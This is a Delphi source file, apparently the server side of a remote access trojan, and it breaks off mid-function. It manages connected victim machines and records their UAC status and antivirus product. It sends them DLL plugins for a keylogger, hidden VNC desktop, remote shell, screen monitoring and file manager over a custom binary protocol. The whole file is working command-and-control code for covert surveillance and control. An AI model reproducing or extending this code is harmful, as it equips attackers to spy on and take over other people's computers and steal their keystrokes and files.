unit ServerManager;

interface

uses
  Winapi.Windows, Winapi.Winsock2,
  System.SysUtils, System.Classes, System.JSON,
  System.Generics.Collections, System.SyncObjs,
  Vcl.ExtCtrls, Vcl.Forms,
  ncSockets, ncLines,
  UnitGetInformation,
  UnitProcessManager,
  UnitRemoteShell,
  UnitRemoteMonitoring,
  UnitKeylogger,
  UnitOpenURL,
  UnitFileManager,
  UnitHiddenVNC;

const
  INFORMATION_PLUGIN_ID       = 'InformationPlugin';
  PROCESS_MANAGER_PLUGIN_ID   = 'ProcessManagerPlugin';
  REMOTE_SHELL_PLUGIN_ID      = 'RemoteShellPlugin';
  REMOTE_MONITORING_PLUGIN_ID = 'RemoteMonitoringPlugin';
  KEYLOGGER_PLUGIN_ID         = 'KeyloggerPlugin';
  OPEN_URL_PLUGIN_ID          = 'OpenURLPlugin';
  FILE_MANAGER_PLUGIN_ID      = 'FileManagerPlugin';
  HIDDEN_VNC_PLUGIN_ID        = 'HiddenVNCPlugin';
  MAX_JSON_BUFFER_SIZE        = 128 * 1024 * 1024;
  PACKET_TYPE_JSON            = $01;
  PACKET_TYPE_DLL             = $02;
  PACKET_TYPE_MONITOR_FRAME   = $03;
  PACKET_TYPE_FILE_UPLOAD     = $04;
  PACKET_TYPE_FILE_DOWNLOAD   = $05;
  PACKET_TYPE_HIDDEN_VNC_FRAME = $06;
  MONITOR_FRAME_FORMAT_JPEG   = 1;

type
  TBinaryPacket = record
    PacketType: Byte;
    Payload: TBytes;
  end;

  // Binary packet header - must match PacketHeader in C++ side
  TPacketHeader = packed record
    Signature  : Word;     // 0x524E ('NR')
    PacketType : Byte;     // 0x01: JSON, 0x02: DLL
    Size       : Cardinal; // Payload size (bytes)
  end;

  TMonitorFramePayloadHeader = packed record
    Monitor  : Cardinal;
    Scale    : Cardinal;
    FPS      : Cardinal;
    Width    : Cardinal;
    Height   : Cardinal;
    Format   : Cardinal; // 1: JPEG
    DataSize : Cardinal;
  end;

  TClientInfo = record
    LineHandle   : TncLine;
    IPAddress    : string;
    Country      : string;
    ID           : string;
    DesktopName  : string;
    OS           : string;
    Date         : string;
    UAC          : string;
    AntiVirus    : string;
    LastPongTime : UInt64;
  end;

  TLogCategory = (lcConnection, lcCommand, lcError);

  TClientEvent              = procedure(const Info: TClientInfo) of object;
  TClientRemoveEvent        = procedure(aLine: TncLine) of object;
  TInfoReceivedEvent        = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TProcessReceivedEvent     = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TRemoteShellReceivedEvent = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TMonitoringReceivedEvent  = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TKeyloggerReceivedEvent   = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TFileManagerReceivedEvent = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  THiddenVNCReceivedEvent   = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TLogEvent                 = procedure(Category: TLogCategory; const Msg: string) of object;

  TServerManager = class
  private
    FServer           : TncTCPServer;
    FLock             : TCriticalSection;
    FClients          : TDictionary<TncLine, TClientInfo>;
    FInfoForms        : TDictionary<TncLine, TForm3>;
    FProcessForms     : TDictionary<TncLine, TForm4>;
    FRemoteShellForms : TDictionary<TncLine, TForm5>;
    FMonitoringForms  : TDictionary<TncLine, TForm6>;
    FKeyloggerForms   : TDictionary<TncLine, TForm7>;
    FOpenURLForms     : TDictionary<TncLine, TForm8>;
    FFileManagerForms : TDictionary<TncLine, TForm9>;
    FHiddenVNCForms   : TDictionary<TncLine, TForm10>;
    FReadBuffers      : TDictionary<TncLine, TBytes>;
    FHeartbeatTimer   : TTimer;
    FIsStopping       : Boolean;

    FOnClientConnected    : TClientEvent;
    FOnClientUpdated      : TClientEvent;
    FOnClientDisconnected : TClientRemoveEvent;
    FOnInfoReceived       : TInfoReceivedEvent;
    FOnProcessReceived    : TProcessReceivedEvent;
    FOnRemoteShellReceived: TRemoteShellReceivedEvent;
    FOnMonitoringReceived : TMonitoringReceivedEvent;
    FOnKeyloggerReceived  : TKeyloggerReceivedEvent;
    FOnFileManagerReceived: TFileManagerReceivedEvent;
    FOnHiddenVNCReceived  : THiddenVNCReceivedEvent;
    FOnLog                : TLogEvent;

    procedure OnConnected   (Sender: TObject; aLine: TncLine);
    procedure OnDisconnected(Sender: TObject; aLine: TncLine);
    procedure OnReadData    (Sender: TObject; aLine: TncLine;
                             const aBuf: TBytes; aBufCount: Integer);
    procedure ProcessJSONMessage(aLine: TncLine; const RawStr: string);
    procedure ProcessMonitoringBinaryFrame(aLine: TncLine; const Payload: TBytes);
    procedure ProcessFileManagerBinaryPacket(aLine: TncLine; PacketType: Byte; const Payload: TBytes);
    procedure OnHeartbeat(Sender: TObject);
    procedure DisconnectLine(aLine: TncLine);
    procedure SendPing(aLine: TncLine);
    procedure DoLog(Category: TLogCategory; const Msg: string);
    procedure DetachProcessForms;
    procedure DetachRemoteShellForms;
    procedure DetachMonitoringForms;
    procedure DetachKeyloggerForms;
    procedure DetachOpenURLForms;
    procedure DetachFileManagerForms;
    procedure DetachHiddenVNCForms;

  public
    constructor Create(aServer: TncTCPServer);
    destructor  Destroy; override;

    procedure Start(Port: Integer);
    procedure Stop;
    procedure SendJSON(aLine: TncLine; JSONObj: TJSONObject);
    procedure SendBinaryPacket(aLine: TncLine; PacketType: Byte; const Data: TBytes);
    procedure SendPlugin(aLine: TncLine; const PluginID: string);
    procedure SendInformationPlugin(aLine: TncLine);
    procedure SendProcessManagerPlugin(aLine: TncLine);
    procedure SendRemoteShellPlugin(aLine: TncLine);
    procedure SendRemoteMonitoringPlugin(aLine: TncLine);
    procedure SendKeyloggerPlugin(aLine: TncLine);
    procedure SendOpenURLPlugin(aLine: TncLine);
    procedure SendFileManagerPlugin(aLine: TncLine);
    procedure SendHiddenVNCPlugin(aLine: TncLine);

    function  TryGetClientInfo(aLine: TncLine; out Info: TClientInfo): Boolean;
    function  IsActive   : Boolean;
    function  ClientCount: Integer;

    procedure RegisterInfoForm  (aLine: TncLine; AForm: TForm3);
    procedure UnregisterInfoForm(aLine: TncLine);
    function  GetInfoForm       (aLine: TncLine): TForm3;

    procedure RegisterProcessForm  (aLine: TncLine; AForm: TForm4);
    procedure UnregisterProcessForm(aLine: TncLine);
    function  GetProcessForm       (aLine: TncLine): TForm4;

    procedure RegisterRemoteShellForm  (aLine: TncLine; AForm: TForm5);
    procedure UnregisterRemoteShellForm(aLine: TncLine);
    function  GetRemoteShellForm       (aLine: TncLine): TForm5;

    procedure RegisterMonitoringForm  (aLine: TncLine; AForm: TForm6);
    procedure UnregisterMonitoringForm(aLine: TncLine);
    function  GetMonitoringForm       (aLine: TncLine): TForm6;

    procedure RegisterKeyloggerForm  (aLine: TncLine; AForm: TForm7);
    procedure UnregisterKeyloggerForm(aLine: TncLine);
    function  GetKeyloggerForm       (aLine: TncLine): TForm7;

    procedure RegisterOpenURLForm  (aLine: TncLine; AForm: TForm8);
    procedure UnregisterOpenURLForm(aLine: TncLine);
    function  GetOpenURLForm       (aLine: TncLine): TForm8;

    procedure RegisterFileManagerForm  (aLine: TncLine; AForm: TForm9);
    procedure UnregisterFileManagerForm(aLine: TncLine);
    function  GetFileManagerForm       (aLine: TncLine): TForm9;

    procedure RegisterHiddenVNCForm  (aLine: TncLine; AForm: TForm10);
    procedure UnregisterHiddenVNCForm(aLine: TncLine);
    function  GetHiddenVNCForm       (aLine: TncLine): TForm10;

    property OnClientConnected    : TClientEvent              read FOnClientConnected     write FOnClientConnected;
    property OnClientUpdated      : TClientEvent              read FOnClientUpdated       write FOnClientUpdated;
    property OnClientDisconnected : TClientRemoveEvent        read FOnClientDisconnected  write FOnClientDisconnected;
    property OnInfoReceived       : TInfoReceivedEvent        read FOnInfoReceived        write FOnInfoReceived;
    property OnProcessReceived    : TProcessReceivedEvent     read FOnProcessReceived     write FOnProcessReceived;
    property OnRemoteShellReceived: TRemoteShellReceivedEvent read FOnRemoteShellReceived write FOnRemoteShellReceived;
    property OnMonitoringReceived : TMonitoringReceivedEvent  read FOnMonitoringReceived  write FOnMonitoringReceived;
    property OnKeyloggerReceived  : TKeyloggerReceivedEvent   read FOnKeyloggerReceived   write FOnKeyloggerReceived;
    property OnFileManagerReceived: TFileManagerReceivedEvent read FOnFileManagerReceived write FOnFileManagerReceived;
    property OnHiddenVNCReceived  : THiddenVNCReceivedEvent   read FOnHiddenVNCReceived   write FOnHiddenVNCReceived;
    property OnLog                : TLogEvent                 read FOnLog                 write FOnLog;
  end;

implementation

type
  TncLineAccess = class(TncLine);

procedure QueueToUI(AProc: TProc);
begin
  TThread.Queue(nil,
    procedure
    begin
      AProc();
    end);
end;

procedure ConsumeBytes(var Buffer: TBytes; Count: Integer);
var
  Remaining: Integer;
begin
  if Count <= 0 then
    Exit;

  if Count >= Length(Buffer) then
  begin
    SetLength(Buffer, 0);
    Exit;
  end;

  Remaining := Length(Buffer) - Count;
  Move(Buffer[Count], Buffer[0], Remaining);
  SetLength(Buffer, Remaining);
end;

{ TServerManager }

constructor TServerManager.Create(aServer: TncTCPServer);
begin
  inherited Create;
  FIsStopping       := False;
  FServer           := aServer;
  FLock             := TCriticalSection.Create;
  FClients          := TDictionary<TncLine, TClientInfo>.Create;
  FInfoForms        := TDictionary<TncLine, TForm3>.Create;
  FProcessForms     := TDictionary<TncLine, TForm4>.Create;
  FRemoteShellForms := TDictionary<TncLine, TForm5>.Create;
  FMonitoringForms  := TDictionary<TncLine, TForm6>.Create;
  FKeyloggerForms   := TDictionary<TncLine, TForm7>.Create;
  FOpenURLForms     := TDictionary<TncLine, TForm8>.Create;
  FFileManagerForms := TDictionary<TncLine, TForm9>.Create;
  FHiddenVNCForms   := TDictionary<TncLine, TForm10>.Create;
  FReadBuffers      := TDictionary<TncLine, TBytes>.Create;

  FServer.OnConnected    := OnConnected;
  FServer.OnDisconnected := OnDisconnected;
  FServer.OnReadData     := OnReadData;

  FHeartbeatTimer          := TTimer.Create(nil);
  FHeartbeatTimer.Interval := 10000;
  FHeartbeatTimer.OnTimer  := OnHeartbeat;
  FHeartbeatTimer.Enabled  := False;
end;

destructor TServerManager.Destroy;
begin
  FHeartbeatTimer.Enabled := False;
  FHeartbeatTimer.Free;
  Stop;
  DetachProcessForms;
  DetachRemoteShellForms;
  DetachMonitoringForms;
  DetachKeyloggerForms;
  DetachOpenURLForms;
  DetachFileManagerForms;
  DetachHiddenVNCForms;
  FReadBuffers.Free;
  FHiddenVNCForms.Free;
  FFileManagerForms.Free;
  FOpenURLForms.Free;
  FKeyloggerForms.Free;
  FMonitoringForms.Free;
  FRemoteShellForms.Free;
  FProcessForms.Free;
  FInfoForms.Free;
  FClients.Free;
  FLock.Free;
  inherited;
end;

procedure TServerManager.Start(Port: Integer);
begin
  if FServer.Active then
    FServer.Active := False;
  FServer.Port            := Port;
  FServer.Active          := True;
  FHeartbeatTimer.Enabled := True;
end;

procedure TServerManager.Stop;
begin
  FIsStopping := True;
  FHeartbeatTimer.Enabled := False;
  FHeartbeatTimer.OnTimer := nil;

  FServer.OnConnected    := nil;
  FServer.OnDisconnected := nil;
  FServer.OnReadData     := nil;

  FOnClientConnected    := nil;
  FOnClientUpdated      := nil;
  FOnClientDisconnected := nil;
  FOnInfoReceived       := nil;
  FOnProcessReceived    := nil;
  FOnRemoteShellReceived:= nil;
  FOnMonitoringReceived := nil;
  FOnKeyloggerReceived  := nil;
  FOnFileManagerReceived:= nil;
  FOnLog                := nil;

  if FServer.Active then
    FServer.Active := False;
end;

function TServerManager.IsActive: Boolean;
begin
  Result := FServer.Active;
end;

function TServerManager.ClientCount: Integer;
begin
  FLock.Enter;
  try
    Result := FClients.Count;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.RegisterHiddenVNCForm(aLine: TncLine; AForm: TForm10);
begin
  FLock.Enter;
  try
    FHiddenVNCForms.AddOrSetValue(aLine, AForm);
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.UnregisterHiddenVNCForm(aLine: TncLine);
var
  AForm: TForm10;
begin
  FLock.Enter;
  try
    if FHiddenVNCForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
      AForm.DetachCallbacks;
    FHiddenVNCForms.Remove(aLine);
  finally
    FLock.Leave;
  end;
end;

function TServerManager.GetHiddenVNCForm(aLine: TncLine): TForm10;
begin
  FLock.Enter;
  try
    if not FHiddenVNCForms.TryGetValue(aLine, Result) then
      Result := nil;
  finally
    FLock.Leave;
  end;
end;

function TServerManager.TryGetClientInfo(aLine: TncLine; out Info: TClientInfo): Boolean;
begin
  FLock.Enter;
  try
    Result := FClients.TryGetValue(aLine, Info);
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.RegisterInfoForm(aLine: TncLine; AForm: TForm3);
begin
  FLock.Enter;
  try
    FInfoForms.AddOrSetValue(aLine, AForm);
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.UnregisterInfoForm(aLine: TncLine);
begin
  FLock.Enter;
  try
    FInfoForms.Remove(aLine);
  finally
    FLock.Leave;
  end;
end;

function TServerManager.GetInfoForm(aLine: TncLine): TForm3;
begin
  FLock.Enter;
  try
    if not FInfoForms.TryGetValue(aLine, Result) then
      Result := nil;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.RegisterProcessForm(aLine: TncLine; AForm: TForm4);
begin
  FLock.Enter;
  try
    FProcessForms.AddOrSetValue(aLine, AForm);
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.UnregisterProcessForm(aLine: TncLine);
var
  AForm: TForm4;
begin
  FLock.Enter;
  try
    if FProcessForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
      AForm.DetachCallbacks;
    FProcessForms.Remove(aLine);
  finally
    FLock.Leave;
  end;
end;

function TServerManager.GetProcessForm(aLine: TncLine): TForm4;
begin
  FLock.Enter;
  try
    if not FProcessForms.TryGetValue(aLine, Result) then
      Result := nil;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.RegisterRemoteShellForm(aLine: TncLine; AForm: TForm5);
begin
  FLock.Enter;
  try
    FRemoteShellForms.AddOrSetValue(aLine, AForm);
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.UnregisterRemoteShellForm(aLine: TncLine);
var
  AForm: TForm5;
begin
  FLock.Enter;
  try
    if FRemoteShellForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
      AForm.DetachCallbacks;
    FRemoteShellForms.Remove(aLine);
  finally
    FLock.Leave;
  end;
end;

function TServerManager.GetRemoteShellForm(aLine: TncLine): TForm5;
begin
  FLock.Enter;
  try
    if not FRemoteShellForms.TryGetValue(aLine, Result) then
      Result := nil;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.RegisterMonitoringForm(aLine: TncLine; AForm: TForm6);
begin
  FLock.Enter;
  try
    FMonitoringForms.AddOrSetValue(aLine, AForm);
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.UnregisterMonitoringForm(aLine: TncLine);
var
  AForm: TForm6;
begin
  FLock.Enter;
  try
    if FMonitoringForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
      AForm.DetachCallbacks;
    FMonitoringForms.Remove(aLine);
  finally
    FLock.Leave;
  end;
end;

function TServerManager.GetMonitoringForm(aLine: TncLine): TForm6;
begin
  FLock.Enter;
  try
    if not FMonitoringForms.TryGetValue(aLine, Result) then
      Result := nil;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.RegisterKeyloggerForm(aLine: TncLine; AForm: TForm7);
begin
  FLock.Enter;
  try
    FKeyloggerForms.AddOrSetValue(aLine, AForm);
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.UnregisterKeyloggerForm(aLine: TncLine);
var
  AForm: TForm7;
begin
  FLock.Enter;
  try
    if FKeyloggerForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
      AForm.DetachCallbacks;
    FKeyloggerForms.Remove(aLine);
  finally
    FLock.Leave;
  end;
end;

function TServerManager.GetKeyloggerForm(aLine: TncLine): TForm7;
begin
  FLock.Enter;
  try
    if not FKeyloggerForms.TryGetValue(aLine, Result) then
      Result := nil;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.RegisterOpenURLForm(aLine: TncLine; AForm: TForm8);
begin
  FLock.Enter;
  try
    FOpenURLForms.AddOrSetValue(aLine, AForm);
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.UnregisterOpenURLForm(aLine: TncLine);
var
  AForm: TForm8;
begin
  FLock.Enter;
  try
    if FOpenURLForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
      AForm.DetachCallbacks;
    FOpenURLForms.Remove(aLine);
  finally
    FLock.Leave;
  end;
end;

function TServerManager.GetOpenURLForm(aLine: TncLine): TForm8;
begin
  FLock.Enter;
  try
    if not FOpenURLForms.TryGetValue(aLine, Result) then
      Result := nil;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.RegisterFileManagerForm(aLine: TncLine; AForm: TForm9);
begin
  FLock.Enter;
  try
    FFileManagerForms.AddOrSetValue(aLine, AForm);
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.UnregisterFileManagerForm(aLine: TncLine);
var
  AForm: TForm9;
begin
  FLock.Enter;
  try
    if FFileManagerForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
      AForm.DetachCallbacks;
    FFileManagerForms.Remove(aLine);
  finally
    FLock.Leave;
  end;
end;

function TServerManager.GetFileManagerForm(aLine: TncLine): TForm9;
begin
  FLock.Enter;
  try
    if not FFileManagerForms.TryGetValue(aLine, Result) then
      Result := nil;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.DetachProcessForms;
var
  AForm: TForm4;
begin
  FLock.Enter;
  try
    for AForm in FProcessForms.Values do
      if Assigned(AForm) then
        AForm.DetachCallbacks;
    FProcessForms.Clear;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.DetachRemoteShellForms;
var
  AForm: TForm5;
begin
  FLock.Enter;
  try
    for AForm in FRemoteShellForms.Values do
      if Assigned(AForm) then
        AForm.DetachCallbacks;
    FRemoteShellForms.Clear;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.DetachMonitoringForms;
var
  AForm: TForm6;
begin
  FLock.Enter;
  try
    for AForm in FMonitoringForms.Values do
      if Assigned(AForm) then
        AForm.DetachCallbacks;
    FMonitoringForms.Clear;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.DetachKeyloggerForms;
var
  AForm: TForm7;
begin
  FLock.Enter;
  try
    for AForm in FKeyloggerForms.Values do
      if Assigned(AForm) then
        AForm.DetachCallbacks;
    FKeyloggerForms.Clear;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.DetachOpenURLForms;
var
  AForm: TForm8;
begin
  FLock.Enter;
  try
    for AForm in FOpenURLForms.Values do
      if Assigned(AForm) then
        AForm.DetachCallbacks;
    FOpenURLForms.Clear;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.DetachFileManagerForms;
var
  AForm: TForm9;
begin
  FLock.Enter;
  try
    for AForm in FFileManagerForms.Values do
      if Assigned(AForm) then
        AForm.DetachCallbacks;
    FFileManagerForms.Clear;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.DetachHiddenVNCForms;
var
  AForm: TForm10;
begin
  FLock.Enter;
  try
    for AForm in FHiddenVNCForms.Values do
      if Assigned(AForm) then
        AForm.DetachCallbacks;
    FHiddenVNCForms.Clear;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.DoLog(Category: TLogCategory; const Msg: string);
begin
  if Assigned(FOnLog) then
  begin
    var CapturedMsg      := Msg;
    var CapturedCategory := Category;
    var CB               := FOnLog;
    QueueToUI(procedure begin CB(CapturedCategory, CapturedMsg); end);
  end;
end;

procedure TServerManager.SendBinaryPacket(aLine: TncLine; PacketType: Byte; const Data: TBytes);
var
  Header : TPacketHeader;
  SendBuf: TBytes;
  DataLen: Integer;
  IP     : string;
  Info   : TClientInfo;
begin
  DataLen           := Length(Data);
  Header.Signature  := $524E; // 'NR'
  Header.PacketType := PacketType;
  Header.Size       := Cardinal(DataLen);

  SetLength(SendBuf, SizeOf(TPacketHeader) + DataLen);
  Move(Header, SendBuf[0], SizeOf(TPacketHeader));
  if DataLen > 0 then
    Move(Data[0], SendBuf[SizeOf(TPacketHeader)], DataLen);

  IP := '';
  if TryGetClientInfo(aLine, Info) then
    IP := Info.IPAddress;

  FLock.Enter;
  try
    if FClients.ContainsKey(aLine) then
    try
      TncLineAccess(aLine).SendBuffer(SendBuf[0], Length(SendBuf));
    except
      on E: Exception do
        DoLog(lcError, 'Binary send error [' + IP + ']: ' + E.Message);
    end;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.SendJSON(aLine: TncLine; JSONObj: TJSONObject);
var
  DataStr  : string;
  DataBytes: TBytes;
  Action   : string;
  IP       : string;
  Info     : TClientInfo;
begin
  if not Assigned(JSONObj) then Exit;

  DataStr   := JSONObj.ToJSON + #13#10;
  DataBytes := TEncoding.UTF8.GetBytes(DataStr);

  Action := '';
  if Assigned(JSONObj.Values['action']) then
    Action := JSONObj.Values['action'].Value;
  IP := '';
  if TryGetClientInfo(aLine, Info) then
    IP := Info.IPAddress;

  if (Action <> '') and (Action <> 'ping') then
    DoLog(lcCommand, '"' + Action + '" command sent to ' + IP);

  FLock.Enter;
  try
    if FClients.ContainsKey(aLine) then
    try
      TncLineAccess(aLine).SendBuffer(DataBytes[0], Length(DataBytes));
    except
      on E: Exception do
        DoLog(lcError, 'JSON send error [' + IP + ']: ' + E.Message);
    end;
  finally
    FLock.Leave;
  end;
end;

procedure TServerManager.SendPlugin(aLine: TncLine; const PluginID: string);
var
  PluginPath: string;
  DLLData   : TBytes;
  FS        : TFileStream;
  IP        : string;
  Info      : TClientInfo;
  ErrObj    : TJSONObject;
begin
  IP := '';
  if TryGetClientInfo(aLine, Info) then
    IP := Info.IPAddress;

  // Security: Prevent directory traversal
  if (PluginID = '') or (Pos('\', PluginID) > 0) or (Pos('/', PluginID) > 0) or (Pos('..', PluginID) > 0) then
  begin
    DoLog(lcError, 'Blocked invalid plugin request: ' + PluginID + ' [' + IP + ']');
    Exit;
  end;

  // Verify client is still connected before proceeding
  FLock.Enter;
  try
    if not FClients.ContainsKey(aLine) then
      Exit;
  finally
    FLock.Leave;
  end;

  PluginPath := ExtractFilePath(ParamStr(0)) + 'plugins\' + PluginID + '.dll';
  if not FileExists(PluginPath) then
  begin
    DoLog(lcError, '"' + PluginID + '" plugin not found [' + IP + ']');
    ErrObj := TJSONObject.Create;
    try
      ErrObj.AddPair('action', 'plugin_error');
      ErrObj.AddPair('id',     PluginID);
      ErrObj.AddPair('reason', 'Plugin not found on server');
      SendJSON(aLine, ErrObj);
    finally
      ErrObj.Free;
    end;
    Exit;
  end;

  try
    FS := TFileStream.Create(PluginPath, fmOpenRead or fmShareDenyWrite);
    try
      SetLength(DLLData, FS.Size);
      if FS.Size > 0 then
        FS.ReadBuffer(DLLData[0], FS.Size);
    finally
      FS.Free;
    end;
  except
    on E: Exception do
    begin
      DoLog(lcError, '"' + PluginID + '" plugin read error [' + IP + ']: ' + E.Message);
      ErrObj := TJSONObject.Create;
      try
        ErrObj.AddPair('action', 'plugin_error');
        ErrObj.AddPair('id',     PluginID);
        ErrObj.AddPair('reason', 'Failed to read plugin: ' + E.Message);
        SendJSON(aLine, ErrObj);
      finally
        ErrObj.Free;
      end;
      Exit;
    end;
  end;

  DoLog(lcCommand, '"' + PluginID + '" sent to ' + IP);
  SendBinaryPacket(aLine, PACKET_TYPE_DLL, DLLData);
end;

procedure TServerManager.SendInformationPlugin(aLine: TncLine);
begin
  SendPlugin(aLine, INFORMATION_PLUGIN_ID);
end;

procedure TServerManager.SendProcessManagerPlugin(aLine: TncLine);
begin
  SendPlugin(aLine, PROCESS_MANAGER_PLUGIN_ID);
end;

procedure TServerManager.SendRemoteShellPlugin(aLine: TncLine);
begin
  SendPlugin(aLine, REMOTE_SHELL_PLUGIN_ID);
end;

procedure TServerManager.SendRemoteMonitoringPlugin(aLine: TncLine);
begin
  SendPlugin(aLine, REMOTE_MONITORING_PLUGIN_ID);
end;

procedure TServerManager.SendKeyloggerPlugin(aLine: TncLine);
begin
  SendPlugin(aLine, KEYLOGGER_PLUGIN_ID);
end;

procedure TServerManager.SendOpenURLPlugin(aLine: TncLine);
begin
  SendPlugin(aLine, OPEN_URL_PLUGIN_ID);
end;

procedure TServerManager.SendFileManagerPlugin(aLine: TncLine);
begin
  SendPlugin(aLine, FILE_MANAGER_PLUGIN_ID);
end;

procedure TServerManager.SendHiddenVNCPlugin(aLine: TncLine);
begin
  SendPlugin(aLine, HIDDEN_VNC_PLUGIN_ID);
end;

{ --- Server Olaylari --- }

procedure TServerManager.OnConnected(Sender: TObject; aLine: TncLine);
var
  Info: TClientInfo;
begin
  Info.LineHandle   := aLine;
  Info.IPAddress    := aLine.PeerIP;
  Info.Country      := '...';
  Info.ID           := TGUID.NewGuid.ToString
                         .Replace('{', '').Replace('}', '').Replace('-', '');
  Info.DesktopName  := '...';
  Info.OS           := '...';
  Info.Date         := '...';
  Info.UAC          := '...';
  Info.AntiVirus    := '...';
  Info.LastPongTime := GetTickCount64;

  FLock.Enter;
  try
    FClients.AddOrSetValue(aLine, Info);
    FReadBuffers.AddOrSetValue(aLine, nil);
  finally
    FLock.Leave;
  end;

  DoLog(lcConnection, 'Client connected: ' + Info.IPAddress);

  if Assigned(FOnClientConnected) then
  begin
    var CapturedInfo := Info;
    var CB           := FOnClientConnected;
    QueueToUI(procedure begin CB(CapturedInfo); end);
  end;
end;

procedure TServerManager.OnDisconnected(Sender: TObject; aLine: TncLine);
var
  IP              : string;
  Info            : TClientInfo;
  ProcessForm     : TForm4;
  RemoteShellForm : TForm5;
  MonitoringForm  : TForm6;
  KeyloggerForm   : TForm7;
  OpenURLForm     : TForm8;
  FileManagerForm : TForm9;
  HiddenVNCForm   : TForm10;
begin
  IP := aLine.PeerIP;
  FLock.Enter;
  try
    if FClients.TryGetValue(aLine, Info) then
      IP := Info.IPAddress;
    FClients.Remove(aLine);
    FReadBuffers.Remove(aLine);
    FInfoForms.Remove(aLine);
    if FProcessForms.TryGetValue(aLine, ProcessForm) and Assigned(ProcessForm) then
      ProcessForm.DetachCallbacks;
    FProcessForms.Remove(aLine);
    if FRemoteShellForms.TryGetValue(aLine, RemoteShellForm) and Assigned(RemoteShellForm) then
      RemoteShellForm.DetachCallbacks;
    FRemoteShellForms.Remove(aLine);
    if FMonitoringForms.TryGetValue(aLine, MonitoringForm) and Assigned(MonitoringForm) then
      MonitoringForm.DetachCallbacks;
    FMonitoringForms.Remove(aLine);
    if FKeyloggerForms.TryGetValue(aLine, KeyloggerForm) and Assigned(KeyloggerForm) then
      KeyloggerForm.DetachCallbacks;
    FKeyloggerForms.Remove(aLine);
    if FOpenURLForms.TryGetValue(aLine, OpenURLForm) and Assigned(OpenURLForm) then
      OpenURLForm.DetachCallbacks;
    FOpenURLForms.Remove(aLine);
    if FFileManagerForms.TryGetValue(aLine, FileManagerForm) and Assigned(FileManagerForm) then
      FileManagerForm.DetachCallbacks;
    FFileManagerForms.Remove(aLine);
    if FHiddenVNCForms.TryGetValue(aLine, HiddenVNCForm) and Assigned(HiddenVNCForm) then
      HiddenVNCForm.DetachCallbacks;
    FHiddenVNCForms.Remove(aLine);
  finally
    FLock.Leave;
  end;

  DoLog(lcConnection, 'Client disconnected: ' + IP);

  if Assigned(FOnClientDisconnected) then
  begin
    var CapturedLine := aLine;
    var CB           := FOnClientDisconnected;
    QueueToUI(procedure begin CB(CapturedLine); end);
  end;
end;

procedure TServerManager.OnReadData(Sender: TObject; aLine: TncLine;
  const aBuf: TBytes; aBufCount: Integer);
var
  Buffer       : TBytes;
  OldLen       : Integer;
  LineEnd      : Integer;
  i            : Integer;
  Header       : TPacketHeader;
  PacketSize   : Integer;
  Payload      : TBytes;
  LineBytes    : TBytes;
  LineText     : string;
  Messages     : TList<string>;
  BinaryPackets: TList<TBinaryPacket>;
  BP           : TBinaryPacket;
begin
  if (aBufCount <= 0) then
    Exit;

  Messages      := TList<string>.Create;
  BinaryPackets := TList<TBinaryPacket>.Create;
  try
    FLock.Enter;
    try
      if FIsStopping then Exit;
      if not FReadBuffers.TryGetValue(aLine, Buffer) then
        SetLength(Buffer, 0);

      OldLen := Length(Buffer);
      SetLength(Buffer, OldLen + aBufCount);
      Move(aBuf[0], Buffer[OldLen], aBufCount);

      while Length(Buffer) > 0 do
      begin
        if (Length(Buffer) >= 2) and (Buffer[0] = $4E) and (Buffer[1] = $52) then // 'NR' signature
        begin
          if Length(Buffer) < SizeOf(TPacketHeader) then
            Break; // Wait for full header

          Move(Buffer[0], Header, SizeOf(TPacketHeader));
          if Header.Signature = $524E then
          begin
            if Header.Size > MAX_JSON_BUFFER_SIZE then
            begin
              SetLength(Buffer, 0);
              Break;
            end;

            PacketSize := SizeOf(TPacketHeader) + Integer(Header.Size);
            if Length(Buffer) < PacketSize then
              Break;

            SetLength(Payload, Header.Size);
            if Header.Size > 0 then
              Move(Buffer[SizeOf(TPacketHeader)], Payload[0], Header.Size);

            if Header.PacketType = PACKET_TYPE_JSON then
              Messages.Add(TEncoding.UTF8.GetString(Payload))
            else
            begin
              BP.PacketType := Header.PacketType;
              BP.Payload := Payload;
              BinaryPackets.Add(BP);
            end;

            ConsumeBytes(Buffer, PacketSize);
            Continue;
          end;
        end;

        LineEnd := -1;
        for i := 0 to Length(Buffer) - 1 do
          if Buffer[i] = 10 then
          begin
            LineEnd := i;
            Break;
          end;

        if LineEnd < 0 then
          Break;

        SetLength(LineBytes, LineEnd);
